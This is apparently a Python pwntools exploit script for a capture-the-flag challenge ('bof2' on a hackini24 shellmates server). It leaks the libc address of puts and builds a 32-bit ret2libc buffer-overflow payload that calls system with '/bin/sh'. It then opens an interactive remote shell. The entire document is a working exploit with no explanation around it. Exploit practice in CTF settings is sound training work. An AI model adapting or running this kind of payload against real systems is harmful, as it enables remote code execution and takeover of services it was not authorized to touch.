#!/usr/bin/env python3
from pwn import *

elf = ELF('./chall')
libc = ELF('./libc.so.6')
local = False

if local:
    conn = elf.process()
else :
    host = 'bof2.hackini24.shellmates.club'
    port = 443
    conn = remote(host,port,ssl=True)

conn.recvuntil("Gift for ya: ")
puts = conn.recvline().strip()
libc.address = int(puts,16) - libc.symbols['puts']
log.info(f'libc @ {hex(libc.address)}')

padding = "A"*76

system = libc.symbols["system"]
log.info(f'system @ {hex(system)}')

ret_add = "AAAA"
bin_sh = next(libc.search(b"/bin/sh"))
log.info(f'/bin/sh @ {hex(bin_sh)}')

payload = flat(padding , system , ret_add , bin_sh)
conn.sendline(payload)
conn.interactive()


conn.close()
